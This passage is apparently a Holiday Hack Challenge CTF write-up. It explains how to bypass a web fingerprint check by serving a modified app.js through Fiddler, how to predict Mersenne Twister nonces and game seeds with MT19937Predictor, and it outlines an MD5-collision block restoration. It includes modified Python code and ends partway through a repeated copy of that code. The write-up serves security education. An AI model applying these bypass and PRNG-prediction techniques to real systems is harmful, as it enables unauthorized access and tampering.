for a flag named \u201cbesanta\u201d for successful scan of the fingerprint. We host that \"app.js\" file in our local with the \"besanta\" check removed and then load that file using Fiddler instead of server app.js. With \"besanta\" check removed, you bypass the fingerprint check. Process : Below actions are as me (not Santa). If you right click on the Scan Fingerprint and \"Inspect\" User Chrome's inspect to look at the javascript behind the \"Scan fingerprint\" image You will see the that fingerprint image is actually a DIV with class name \"print-cover\" with click action handler of which is in app.js. View source showing the click handler will execute a function in https://elevator.kringlecastle.com/app.js Now look at the event handler in the app.js. In addition to the powered, it checks if the token named \" besanta \". If It\u2019s there, it will allow to go to Santa's office. If not, it will play error sound. Click handler of \"Scan fingerprint\" image Now, what we can do is to make a copy of this app.js, remove that && hasToken('besanta') condition. Then host that in local IIS server (like http://localhost/app.js ) Check for \"besanta\" removed in local app.js Open Fiddler and apply filter for app.js so when you click on the scan fingerprint image only that URL gets captured. https://elevator.kringlecastle.com/app.js Traffic to https://elevator.kringlecatsle.com/app.js is captured. Filter applied Filter to \"show if URL contains\" Filter value \"app.js\" Save the contents of https://elevator.kringlecastle.com/app.js to a file named app.js and py the file in local IIS server e.g. c:\\inetpub\\wwwroot so the file could be accessble on https://localhost/app.js See the below screenshot (steps are numbered): Go to Fiddler > AutoResponder (1) > Enable Rules (2) > Add Rule (3) > Add https://localhost/app.js (4) > Save (5) This will replace the has Token app.js file from sever https://elevator.kringlecastle.com/app.js (with 'besanta' check) Now when you click on the fingerprint scanner, you will be able to get into Santa's office. Objective 11a): Naughty/Nice List with Blockchain Investigation Part 1 Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce) Answer : 57066318F32F729D High-level approach : In Santa's office, Tinsel Upatree has the Blockchain.dat and the zip file containing the python script The naughty_nice.py verifies the block chain up to block# 129996. So, we have nonce up to 12996. If we get the last 624 nonces with last one being of block# 12996, we can use the MT19937Predictor to get the nonce of 12997, 12998, 12999 and finally 13000 which is needed by this objective. Details : The zip file named OfficialNaughtyNiceBlockchainEducationPack.zip has following contents. We put the Blockchain.dat to examine it using the naughty_nice.py Contents of \"OfficialNaughtyNiceBlockchainEducationPack.zip\" The naughty_nice.py was changed to get all the last 624 nonces of the blockchain. Then those last 624 nonces were fed into the MT19937Predictor() to get nonce for block# 12997 The nonce of 12997 was included in the list to get the nonce for block# 12998. The nonce of 12998 was included in the list to get the nonce for block# 12999. The nonce of 12999 was included in the list to get the nonce for block# 13000. For changes in the naughty_nice.py, compare the naughty_nice_original.py and naughty_nice.py. Changes in \"naughty_nice.py\" Running naughty_nice.py. The nonce for block#13000 is 6270808489970332317 Converting to hexadecimal It would be 57066318F32F729D and that\u2019s the answer. Convering decimal to hex The below zip file contains the changed naughty_nice.py (please remove the .txt after extraction) naughty_nice.py Download naughty_nice.py #!/usr/bin/env python3 ''' So, you want to work with the naughty/nice blockchain? Welcome! This python module is your first step in that process. It will introduce you to how the Naughty/Nice blockchain is structured and how we at the North Pole use blockchain technology. The North Pole has been using blockchain technology since Santa first invented it back in the 1960's. (Jolly prankster that he is, Santa posted a white paper on the Internet that he wrote under a pseudonym describing a non-Naughty/Nice application of blockchains a dozen or so years back. It caused quite a stir...) Important note: This module will NOT allow you to add content to the Official Naughty/Nice Blockchain! That can only be done through the Official Naughty/Nice Website, which passes new blocks to the Official Santa Signature System (OS3) that applies a digital signature to the content of each block before it is added to the chain. Only blocks whose contents have been digitally signed by that system are placed on the Naughty/Nice blockchain. Note: If you're authorized to use the Official Naughty/Nice website, you will have been given a login and password for that site after completing your training as a part of Elf University's \"Assessing and Evaluating Human Behavior for Naughty/Niceness\" Curriculum. This code is used to introduce how blocks/chains are created and allow you to view and/or validate portions (or the entirety) of the Official Naughty/Nice Blockchain. A blockchain, while a part of the whole cryptocurrency \"fad\" that a certain pseudonym-packing North Pole resident appears to have begun, are certainly not limited to that use. A blockchain can be used anywhere that a record of information or transactions need to be maintained in a way that cannot be altered. And really, what information is more important (and necessarily unalterable) than acts of Naughty/Niceness? A blockchain works by linking each record together with the previous record. Each block's data contains a cryptographic hash of the previous block's data. Because a block cannot be altered without altering the cryptographic hash of its contents, any alteration of the data within a block will be immediately evident, because every following block will no longer be valid. In addition to this built-in property of a blockchain, the Official Naughty/Nice Blockchain has a few other safeguards. The cryptographic hash of each block is signed using the Official Santa Signature System (OS3). Currently, the Official Naughty/Nice Blockchain uses MD5 as its hashing algorithm, but plans are in place to move to SHA256 in 2021. This update is part of a phased process to modernize the blockchain code. In 2019, the entire blockchain system was ported from the original COBOL code to Python3. Because of concerns about hash collisions in MD5, in the new Python3 code, a 64-bit random \"nonce\" was added to the beginning of each block at the time of creation. This module represents a portion of the most current blockchain codebase. It consists of two classes, one for the creation of blocks, called Block(), and one for the creation, examination, and verification of chains of blocks, called Chain(). The following is an overview of the functionality provided by these classes: The Chain() class is where most blockchain work is performed. It is designed to be as \"block-agnostic\" as possible, so it can be used with blocks that hold different types of data. To use a different type of block, you simply replace (or subclass) the Block() class. For this to work, there are several functions that MUST be supplied by the Block() class. Let's take a look at those. The Block() class MUST supply the following functions, used by the Chain() class: create\\_genesis\\_block() - This creates a very special block used at the beginning of the blockchain, and known as the \"genesis\" block. Because it has no previous block to reference it is, by definition, always considered valid. This block uses an agreed-upon, fake previous hash value. verify\\_types() - Because the Chain() class is block-agnostic, it needs the Block() class to validate that a block contains valid data. This function returns True or False. block\\_data() - a function that returns a representation of all of the data in the block that is to be hashed and signed. The data is returned as a Python3 bytes object. full\\_block\\_data() - a function that returns a representation of the entire block, including any hashes and signatures. A hash of this data is what is used as the \"previous hash\" value in the subsequent block. This data is returned as a Python3 bytes object. This function is also used when saving either the entire blockchain to a file, or a single block to a file load\\_a\\_block(\\[filehandle\\]) - this function takes a filehandle and returns a block at a time for addition to the block chain. This function DOES NOT verify blocks. This function throws a Value\\_Error exception when it either encounters the end of the file or unparsable data. The Naughty/Nice Block() class also defines a utility function: dump\\_doc(\\[document number\\]) - this will dump the indicated supporting document to a file named as <block\\_index>.<data\\_type\\_extension>. Note: this function will overwrite any existing file with that name, so if there are multiple documents (there can be up to 9) of the same type affixed to a record, it is the responsibility of the calling process to rename them as appropriate. The Chain() class provides the following functions: add\\_block(\\[block\\_data\\]) - passes a block\\_data dictionary to the Block() initialization code. This function, being \"block-agnostic\" simply passes the block\\_data along. It is up to the Block() initialization code to validate this data. verify\\_chain(\\[public\\_key\\], <beginning hash>) - steps through every block in the chain and verifies that the data in each block is of the correct type, that the block index is correct, that the block contains the correct hash for the previous block, and that the block signature is a valid signature based on the hash of the block data. It then hashes the full block for use as the \"previous hash\" on the next block. This returns True or False. (If False, it prints information about what, specific, issues were found and the block that triggered the issue.) Note: If you're working with a portion of the block chain that does not begin with a genesis block, you'll need to provide a value for the previous block's hash for this function to work. save\\_a\\_block(index, <filename>) - saves the block at index to the filename provided, or to \"block.dat\" if no filename is given. save\\_chain(<filename>) - saves the chain to the filename provided, or to \"blockchain.dat\" if no filename is given. load\\_chain(<filename>) - loads a chain from the filename provided, or from \"blockchain.dat\" if no filename is given. This returns the count of blocks loaded. This DOES NOT verify that the data loaded is a valid blockchain. It is recommended to call verify\\_chain() immediately after loading a new chain. An overview of how we process the Official Naughty/Nice Blockchain: There are approximately 7.8 billion people and magical beings on Earth, and each one is tracked 24 hours a day throughout the year by a fleet of Elves-On-The-Shelves. While those elves are clearly visible during the Holiday season, don't be fooled into believing that we're only tracking Naughty/Niceness at that time. On average, each of the billions of subjects that we monitor are performing some sort of Naughty or Nice activity that rises to the level of being scored on the blockchain around 2.1 times per week. Keeping track of all of that activity on a single blockchain would be incredibly processing intensive (that would be ~1^12 blocks/year, or 32,000 blocks/second), so we've broken our record-keeping into 1,000 different blockchains. If you do the math, you'll find that each of the blockchains is now responsible for between 1,500 and 2000 blocks per minute, which is a reasonable load. A separate database keeps track of which Personal ID (pid) is assigned to each of the blockchains. Throughout the year, we periodically run each of the chains to determine who is the best (and worst) of our subjects. While only the final Holiday run is used to determine who is getting something good in their stockings and who is getting a lump of coal, it's always interesting to see a listing of the Nicest and Naughtiest folks out there. Please note: Wagering on the results of the Official Naughty/Nice Blockchain is STRICTLY PROHIBITED. If you intend to use your access to the Official Naughty/Nice Blockchain code to facilitate any sort of gambling, you will be racking up a whole bunch of Naughtiness points. YOU HAVE BEEN WARNED! (I'm looking at you, Alabaster Snowball...) For this reason, we have not provided any code that will perform a computation of Naughty/Nice points. Additionally, for privacy reasons, there is also no code to pull the records associated with specific individuals from this list. While the creation of that code would not be difficult, you are honor-bound to use your access to this list for only good and noble purposes. Signing Keys - Information We have provided you with an example private key that you can use when generating your own blockchains for test purposes. This private key (which also contains the public key information) is called private.pem. Additionally, we have provided you with a copy of the public key used to verify the Official Naughty/Nice Blockchain. This is the public key component of the private key used by the Official Santa Signature System (OS3) to sign blocks on the Official Naughty/Nice Blockchain. This key is contained in the file official\\_public.pem. ''' import random from Crypto.Hash import MD5, SHA256 from Crypto.PublicKey import RSA from Crypto.Signature import PKCS1\\_v1\\_5 from base64 import b64encode, b64decode import binascii import time import itertools from mt19937predictor import MT19937Predictor genesis\\_block\\_fake\\_hash = '00000000000000000000000000000000' data\\_types = {1:'plaintext', 2:'jpeg image', 3:'bmp image', 4:'gif image', 5:'PDF', 6:'Word', 7:'PowerPoint', 8:'Excel', 9:'tiff image', 10:'MP4 video', 11:'MOV video', 12:'WMV video', 13:'FLV video', 14:'AVI video', 255:'Binary blob'} data\\_extension = {1:'txt', 2:'jpg', 3:'bmp', 4:'gif', 5:'pdf', 6:'docx', 7:'pptx', 8:'xlsx', 9:'tiff', 10:'mp4', 11:'mov', 12:'wmv', 13:'flv', 14:'avi', 255:'bin'} Naughty = 0 Nice = 1 class Block(): def \\_\\_init\\_\\_(self, index=None, block\\_data=None, previous\\_hash=None, load=False, genesis=False): if(genesis == True): return None else: self.data = \\[\\] if(load == False): if all(p is not None for p in \\[index, block\\_data\\['documents'\\], block\\_data\\['pid'\\], block\\_data\\['rid'\\], block\\_data\\['score'\\], block\\_data\\['sign'\\], previous\\_hash\\]): self.index = index if self.index == 0: self.nonce = 0 # genesis block else: self.nonce = random.randrange(0xFFFFFFFFFFFFFFFF) self.data = block\\_data\\['documents'\\] self.previous\\_hash = previous\\_hash self.doc\\_count = len(self.data) self.pid = block\\_data\\['pid'\\] self.rid = block\\_data\\['rid'\\] self.score = block\\_data\\['score'\\] self.sign = block\\_data\\['sign'\\] now = time.gmtime() self.month = now.tm\\_mon self.day = now.tm\\_mday self.hour = now.tm\\_hour self.minute = now.tm\\_min self.second = now.tm\\_sec self.hash, self.sig = self.hash\\_n\\_sign() else: return None def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def \\_\\_repr\\_\\_(self): s = 'Chain Index: %i\\\\n' % (self.index) s += ' Nonce: %s\\\\n' % ('%016.016x' % (self.nonce)) s += ' PID: %s\\\\n' % ('%016.016x' % (self.pid)) s += ' RID: %s\\\\n' % ('%016.016x' % (self.rid)) s += ' Document Count: %1.1i\\\\n' % (self.doc\\_count) s += ' Score: %s\\\\n' % ('%08.08x (%i)' % (self.score, self.score)) n\\_n = 'Naughty' if self.sign > 0: n\\_n = 'Nice' s += ' Sign: %1.1i (%s)\\\\n' % (self.sign, n\\_n) c = 1 for d in self.data: s += ' Data item: %i\\\\n' % (c) s += ' Data Type: %s (%s)\\\\n' % ('%02.02x' % (d\\['type'\\]), data\\_types\\[d\\['type'\\]\\]) s += ' Data Length: %s\\\\n' % ('%08.08x' % (d\\['length'\\])) s += ' Data: %s\\\\n' % (binascii.hexlify(d\\['data'\\])) c += 1 s += ' Date: %s/%s\\\\n' % ('%02.02i' % (self.month), '%02.02i' % (self.day)) s += ' Time: %s:%s:%s\\\\n' % ('%02.02i' % (self.hour), '%02.02i' % (self.minute), '%02.02i' % (self.second)) s += ' PreviousHash: %s\\\\n' % (self.previous\\_hash) s += ' Data Hash to Sign: %s\\\\n' % (self.hash) s += ' Signature: %s\\\\n' % (self.sig) return(s) def full\\_hash(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data\\_signed()) return hash\\_obj.hexdigest() def hash\\_n\\_sign(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data()) signer = PKCS1\\_v1\\_5.new(private\\_key) return (hash\\_obj.hexdigest(), b64encode(signer.sign(hash\\_obj))) def block\\_data(self): s = (str('%016.016x' % (self.index)).encode('utf-8')) s += (str('%016.016x' % (self.nonce)).encode('utf-8')) s += (str('%016.016x' % (self.pid)).encode('utf-8')) s += (str('%016.016x' % (self.rid)).encode('utf-8')) s += (str('%1.1i' % (self.doc\\_count)).encode('utf-8')) s += (str(('%08.08x' % (self.score))).encode('utf-8')) s += (str('%1.1i' % (self.sign)).encode('utf-8')) for d in self.data: s += (str('%02.02x' % d\\['type'\\]).encode('utf-8')) s += (str('%08.08x' % d\\['length'\\]).encode('utf-8')) s += d\\['data'\\] s += (str('%02.02i' % (self.month)).encode('utf-8')) s += (str('%02.02i' % (self.day)).encode('utf-8')) s += (str('%02.02i' % (self.hour)).encode('utf-8')) s += (str('%02.02i' % (self.minute)).encode('utf-8')) s += (str('%02.02i' % (self.second)).encode('utf-8')) s += (str(self.previous\\_hash).encode('utf-8')) return(s) def block\\_data\\_signed(self): s = self.block\\_data() s += bytes(self.hash.encode('utf-8')) s += self.sig return(s) def load\\_a\\_block(self, fh): self.index = int(fh.read(16), 16) self.nonce = int(fh.read(16), 16) self.pid = int(fh.read(16), 16) self.rid = int(fh.read(16), 16) self.doc\\_count = int(fh.read(1), 10) self.score = int(fh.read(8), 16) self.sign = int(fh.read(1), 10) count = self.doc\\_count while(count > 0): l\\_data = {} l\\_data\\['type'\\] = int(fh.read(2),16) l\\_data\\['length'\\] = int(fh.read(8), 16) l\\_data\\['data'\\] = fh.read(l\\_data\\['length'\\]) self.data.append(l\\_data) count -= 1 self.month = int(fh.read(2)) self.day = int(fh.read(2)) self.hour = int(fh.read(2)) self.minute = int(fh.read(2)) self.second = int(fh.read(2)) self.previous\\_hash = str(fh.read(32))\\[2:-1\\] self.hash = str(fh.read(32))\\[2:-1\\] self.sig = fh.read(344) return self def create\\_genesis\\_block(self): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes('Genesis Block'.encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 0 block\\_data\\['rid'\\] = 0 block\\_data\\['score'\\] = 0 block\\_data\\['sign'\\] = Nice b = Block(0, block\\_data, genesis\\_block\\_fake\\_hash) return b def verify\\_types(self): # check data types of all info in a block rv = True instances = \\[self.index, self.nonce, self.pid, self.rid, self.month, self.day, self.hour, self.minute, self.second, self.previous\\_hash, self.score, self.sign\\] types = \\[int, int, int, int, int, int, int, int, int, str, int, int\\] if not sum(map(lambda inst\\_, type\\_: isinstance(inst\\_, type\\_), instances, types)) == len(instances): rv = False for d in self.data: if not isinstance(d\\['type'\\], int): rv = False if not isinstance(d\\['length'\\], int): rv = False if not isinstance(d\\['data'\\], bytes): rv = False return rv def dump\\_doc(self, doc\\_no): filename = '%s.%s' % (str(self.index), data\\_extension\\[self.data\\[doc\\_no - 1\\]\\['type'\\]\\]) with open(filename, 'wb') as fh: d = self.data\\[doc\\_no - 1\\]\\['data'\\] fh.write(d) print('Document dumped as: %s' % (filename)) class Chain(): nonce\\_list = \\[\\] index = 0 initial\\_index = 0 last\\_hash\\_value = '' def \\_\\_init\\_\\_(self, load=False, filename=None): if not load: self.blocks = \\[Block(genesis=True).create\\_genesis\\_block()\\] self.last\\_hash\\_value = self.blocks\\[0\\].full\\_hash() else: self.blocks = \\[\\] self.load\\_chain(filename) self.index = self.blocks\\[-1\\].index self.initial\\_index = self.blocks\\[0\\].index def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def add\\_block(self, block\\_data): self.index += 1 b = Block(self.index, block\\_data, self.last\\_hash\\_value) self.blocks.append(b) self.last\\_hash\\_value = b.full\\_hash() def verify\\_chain(self, publickey, previous\\_hash=None): flag = True # unless we're explicitly told what the initial last hash should be, we assume that # the initial block will be the genesis block and will have a fixed previous\\_hash if previous\\_hash is None: previous\\_hash = genesis\\_block\\_fake\\_hash for i in range(0, len(self.blocks)): # assume Genesis block integrity block\\_no = self.blocks\\[i\\].index if not self.blocks\\[i\\].verify\\_types(): flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong data type(s) at block {block\\_no}.') if self.blocks\\[i\\].index != i + self.initial\\_index: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong block index at what should be block {i + self.initial\\_index}: {block\\_no}.') if self.blocks\\[i\\].previous\\_hash != previous\\_hash: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong previous hash at block {block\\_no}.') hash\\_obj = MD5.new() hash\\_obj.update(self.blocks\\[i\\].block\\_data()) signer = PKCS1\\_v1\\_5.new(publickey) if signer.verify(hash\\_obj, b64decode(self.blocks\\[i\\].sig)) is False: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Bad signature at block {block\\_no}.') if flag == False: print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Blockchain invalid from block {block\\_no} onward.\\\\n') return False previous\\_hash = self.blocks\\[i\\].full\\_hash() return True def save\\_a\\_block(self, index, filename=None): if filename is None: filename = 'block.dat' with open(filename, 'wb') as fh: fh.write(self.blocks\\[index\\].block\\_data\\_signed()) def save\\_chain(self, filename=None): if filename is None: filname = 'blockchain.dat' with open(filename, 'wb') as fh: i = 0 while(i < len(self.blocks)): fh.write(self.blocks\\[i\\].block\\_data\\_signed()) i += 1 def load\\_chain(self, filename=None): count = 0 if filename is None: filename = 'blockchain.dat' with open(filename, 'rb') as fh: while(1): try: self.blocks.append(Block(load=True).load\\_a\\_block(fh)) self.index = self.blocks\\[-1\\].index count += 1 except ValueError: return count if \\_\\_name\\_\\_ == '\\_\\_main\\_\\_': with open('private.pem', 'rb') as fh: private\\_key = RSA.importKey(fh.read()) public\\_key = private\\_key.publickey() c1 = Chain() for i in range(9): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes(('This is block %i of the naughty/nice blockchain.' % (i)).encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 123 # this is the pid, or \"person id,\" that the block is about block\\_data\\['rid'\\] = 456 # this is the rid, or \"reporter id,\" of the reporting elf block\\_data\\['score'\\] = 100 # this is the Naughty/Nice score of the report block\\_data\\['sign'\\] = Nice # this indicates whether the report is about naughty or nice behavior c1.add\\_block(block\\_data) print(c1.blocks\\[3\\]) print('C1: Block chain verify: %s' % (c1.verify\\_chain(public\\_key))) #Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat # with open('official\\_public.pem', 'rb') as fh: official\\_public\\_key = RSA.importKey(fh.read()) c2 = Chain(load=True, filename='blockchain.dat') print('C2: Block chain verify: %s' % (c2.verify\\_chain(official\\_public\\_key))) print(c2.blocks\\[0\\]) c2.blocks\\[0\\].dump\\_doc(1) predictor = MT19937Predictor() nonce\\_list= \\[\\] # Adding all the nonces of all the blocks in a list for i in range(len(c2.blocks)): nonce\\_list.append(c2.blocks\\[i\\].nonce) # reeversing the list nonce\\_list.reverse() # get the first 625 nonces last\\_625\\_block\\_nonce = list(itertools.islice(nonce\\_list,625)) # reverse the list so we get the last 625 nonces last\\_625\\_block\\_nonce.reverse() # Setting the data for 625 nonces to the MT19937Predictor for nonce in last\\_625\\_block\\_nonce: predictor.setrandbits(nonce, 64) # calcutated nonce and added for block 12997 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(13205885317093879758,64) # calculated nonce and added for block 12998 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(109892600914328301,64) # calculated nonce and added for block 12999 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(9533956617156166628,64) # Get the nonce for block 13000 print(predictor.getrandbits(64)) The snowball fight : We need to solve this challenge to get more hints for objective 11b) Welcome to Snowball Fight! You and an opponent each have five snow forts, but you can't see the others' layout. Start lobbing snowballs back and forth. Be the first to hit everything on your opponent's side! Note: On easier levels, you may pick your own name. On the Hard and Impossible level, we will pick for you. That's just how things work around here! What's more, on Impossible, we won't even SHOW you your name! In fact, just to make sure things are super random, we'll throw away hundreds of random names before starting! High level Approach : Open the \"Impossible\" game. In the impossible, get seeds, predict seed. See below (\"How to get the random seeds and calculate the next seed\"). Open the game in a new window https://snowball2.kringlecastle.com/. In this window, open the \"easy\" game and use the seed predicted in step 2). Win the easy game. Record the moves. Go back to the \"impossible\" window and use the same moves. Win the 'Impossible' game. Process details : You will see a number of seeds in the below URL response https://snowball2.kringlecastle.com/game They are exactly 624 seeds indicating the next seed could be predicted using the Mersenne Twister algorithm. So, we can use the python script M19937 to predict the next seed. 624 seeds in view source Keep all the 624 seeds in the data.txt. Create a new bash script \"predict-next-seed.sh\" which would take the data in the data.txt, apply mt19937 on it and predict next set of numbers in predicted.txt !/bin/bash cat data.txt | mt19937predict > predicted.txt Run the bash script for a very small time (0.1 sec). timeout 0.1s ./predict-next-seed.sh The first entry in the output predicted.txt is the next seed. The predicted next seed after 624 seeds is 476691297 Login using the username 476691297 in an easy game. Win the easy game. Record the moves. Use the same moves made in the easy window in the impossible window . New hints unlocked!! Objective 11b): Naughty/Nice List with Blockchain Investigation Part 2 Answer: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb High level approach : Change naughty_nice.py: Get Jake\u2019s Block from the chain and save it as a binary (block.dat) Extract all the docs from the Jake\u2019s block Determine and extract the original naughty document. This is the document Jake modified to put nice list on it. \u2013 This would be the 1st byte on the Jake\u2019s block which he changed. ref: https://speakerdeck.com/ange/colltris?slide=194 Determine the flag for naughty/nice. This is the flag which Jake changed from naughty to nice \u2013 this would-be 2nd byte on the Jake\u2019s block which he changed. Determine 3rd and 4th byte which were changed by Jake ref: https://speakerdeck.com/ange/colltris?slide=109 Make changes on 1st, 2nd, 3rd and 4th byte on Jake\u2019s block making sure the MD5 hash does not change Save the original block restored from Jack\u2019s block and save as block_restored.dat file. Calculate the SHA256 of the blockchain_restored.dat. Process : Changes to naughty_nice.py: Added a function named full_hash_SHA256() which will calculate the SHA256 hash of the block. Screenshot 1 below. Added code to calculate the SHA256 hash for each block and If Its equal to the 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f, it saves the block to a new file named block.dat. It also extracts all the documents from the Jack\u2019s block - 129459.pdf and 129459.bin Screenshot 2 below. Screenshot 1 Screenshot 2 The whole naughty_nice.py #!/usr/bin/env python3 ''' So, you want to work with the naughty/nice blockchain? Welcome! This python module is your first step in that process. It will introduce you to how the Naughty/Nice blockchain is structured and how we at the North Pole use blockchain technology. The North Pole has been using blockchain technology since Santa first invented it back in the 1960's. (Jolly prankster that he is, Santa posted a white paper on the Internet that he wrote under a pseudonym describing a non-Naughty/Nice application of blockchains a dozen or so years back. It caused quite a stir...) Important note: This module will NOT allow you to add content to the Official Naughty/Nice Blockchain! That can only be done through the Official Naughty/Nice Website, which passes new blocks to the Official Santa Signature System (OS3) that applies a digital signature to the content of each block before it is added to the chain. Only blocks whose contents have been digitally signed by that system are placed on the Naughty/Nice blockchain. Note: If you're authorized to use the Official Naughty/Nice website, you will have been given a login and password for that site after completing your training as a part of Elf University's \"Assessing and Evaluating Human Behavior for Naughty/Niceness\" Curriculum. This code is used to introduce how blocks/chains are created and allow you to view and/or validate portions (or the entirety) of the Official Naughty/Nice Blockchain. A blockchain, while a part of the whole cryptocurrency \"fad\" that a certain pseudonym-packing North Pole resident appears to have begun, are certainly not limited to that use. A blockchain can be used anywhere that a record of information or transactions need to be maintained in a way that cannot be altered. And really, what information is more important (and necessarily unalterable) than acts of Naughty/Niceness? A blockchain works by linking each record together with the previous record. Each block's data contains a cryptographic hash of the previous block's data. Because a block cannot be altered without altering the cryptographic hash of its contents, any alteration of the data within a block will be immediately evident, because every following block will no longer be valid. In addition to this built-in property of a blockchain, the Official Naughty/Nice Blockchain has a few other safeguards. The cryptographic hash of each block is signed using the Official Santa Signature System (OS3). Currently, the Official Naughty/Nice Blockchain uses MD5 as its hashing algorithm, but plans are in place to move to SHA256 in 2021. This update is part of a phased process to modernize the blockchain code. In 2019, the entire blockchain system was ported from the original COBOL code to Python3. Because of concerns about hash collisions in MD5, in the new Python3 code, a 64-bit random \"nonce\" was added to the beginning of each block at the time of creation. This module represents a portion of the most current blockchain codebase. It consists of two classes, one for the creation of blocks, called Block(), and one for the creation, examination, and verification of chains of blocks, called Chain(). The following is an overview of the functionality provided by these classes: The Chain() class is where most blockchain work is performed. It is designed to be as \"block-agnostic\" as possible, so it can be used with blocks that hold different types of data. To use a different type of block, you simply replace (or subclass) the Block() class. For this to work, there are several functions that MUST be supplied by the Block() class. Let's take a look at those. The Block() class MUST supply the following functions, used by the Chain() class: create\\_genesis\\_block() - This creates a very special block used at the beginning of the blockchain, and known as the \"genesis\" block. Because it has no previous block to reference it is, by definition, always considered valid. This block uses an agreed-upon, fake previous hash value. verify\\_types() - Because the Chain() class is block-agnostic, it needs the Block() class to validate that a block contains valid data. This function returns True or False. block\\_data() - a function that returns a representation of all of the data in the block that is to be hashed and signed. The data is returned as a Python3 bytes object. full\\_block\\_data() - a function that returns a representation of the entire block, including any hashes and signatures. A hash of this data is what is used as the \"previous hash\" value in the subsequent block. This data is returned as a Python3 bytes object. This function is also used when saving either the entire blockchain to a file, or a single block to a file load\\_a\\_block(\\[filehandle\\]) - this function takes a filehandle and returns a block at a time for addition to the block chain. This function DOES NOT verify blocks. This function throws a Value\\_Error exception when it either encounters the end of the file or unparsable data. The Naughty/Nice Block() class also defines a utility function: dump\\_doc(\\[document number\\]) - this will dump the indicated supporting document to a file named as <block\\_index>.<data\\_type\\_extension>. Note: this function will overwrite any existing file with that name, so if there are multiple documents (there can be up to 9) of the same type affixed to a record, it is the responsibility of the calling process to rename them as appropriate. The Chain() class provides the following functions: add\\_block(\\[block\\_data\\]) - passes a block\\_data dictionary to the Block() initialization code. This function, being \"block-agnostic\" simply passes the block\\_data along. It is up to the Block() initialization code to validate this data. verify\\_chain(\\[public\\_key\\], <beginning hash>) - steps through every block in the chain and verifies that the data in each block is of the correct type, that the block index is correct, that the block contains the correct hash for the previous block, and that the block signature is a valid signature based on the hash of the block data. It then hashes the full block for use as the \"previous hash\" on the next block. This returns True or False. (If False, it prints information about what, specific, issues were found and the block that triggered the issue.) Note: If you're working with a portion of the block chain that does not begin with a genesis block, you'll need to provide a value for the previous block's hash for this function to work. save\\_a\\_block(index, <filename>) - saves the block at index to the filename provided, or to \"block.dat\" if no filename is given. save\\_chain(<filename>) - saves the chain to the filename provided, or to \"blockchain.dat\" if no filename is given. load\\_chain(<filename>) - loads a chain from the filename provided, or from \"blockchain.dat\" if no filename is given. This returns the count of blocks loaded. This DOES NOT verify that the data loaded is a valid blockchain. It is recommended to call verify\\_chain() immediately after loading a new chain. An overview of how we process the Official Naughty/Nice Blockchain: There are approximately 7.8 billion people and magical beings on Earth, and each one is tracked 24 hours a day throughout the year by a fleet of Elves-On-The-Shelves. While those elves are clearly visible during the Holiday season, don't be fooled into believing that we're only tracking Naughty/Niceness at that time. On average, each of the billions of subjects that we monitor are performing some sort of Naughty or Nice activity that rises to the level of being scored on the blockchain around 2.1 times per week. Keeping track of all of that activity on a single blockchain would be incredibly processing intensive (that would be ~1^12 blocks/year, or 32,000 blocks/second), so we've broken our record-keeping into 1,000 different blockchains. If you do the math, you'll find that each of the blockchains is now responsible for between 1,500 and 2000 blocks per minute, which is a reasonable load. A separate database keeps track of which Personal ID (pid) is assigned to each of the blockchains. Throughout the year, we periodically run each of the chains to determine who is the best (and worst) of our subjects. While only the final Holiday run is used to determine who is getting something good in their stockings and who is getting a lump of coal, it's always interesting to see a listing of the Nicest and Naughtiest folks out there. Please note: Wagering on the results of the Official Naughty/Nice Blockchain is STRICTLY PROHIBITED. If you intend to use your access to the Official Naughty/Nice Blockchain code to facilitate any sort of gambling, you will be racking up a whole bunch of Naughtiness points. YOU HAVE BEEN WARNED! (I'm looking at you, Alabaster Snowball...) For this reason, we have not provided any code that will perform a computation of Naughty/Nice points. Additionally, for privacy reasons, there is also no code to pull the records associated with specific individuals from this list. While the creation of that code would not be difficult, you are honor-bound to use your access to this list for only good and noble purposes. Signing Keys - Information We have provided you with an example private key that you can use when generating your own blockchains for test purposes. This private key (which also contains the public key information) is called private.pem. Additionally, we have provided you with a copy of the public key used to verify the Official Naughty/Nice Blockchain. This is the public key component of the private key used by the Official Santa Signature System (OS3) to sign blocks on the Official Naughty/Nice Blockchain. This key is contained in the file official\\_public.pem. ''' import random from Crypto.Hash import MD5, SHA256 from Crypto.PublicKey import RSA from Crypto.Signature import PKCS1\\_v1\\_5 from base64 import b64encode, b64decode import binascii import time import itertools from mt19937predictor import MT19937Predictor genesis\\_block\\_fake\\_hash = '00000000000000000000000000000000' data\\_types = {1:'plaintext', 2:'jpeg image', 3:'bmp image', 4:'gif image', 5:'PDF', 6:'Word', 7:'PowerPoint', 8:'Excel', 9:'tiff image', 10:'MP4 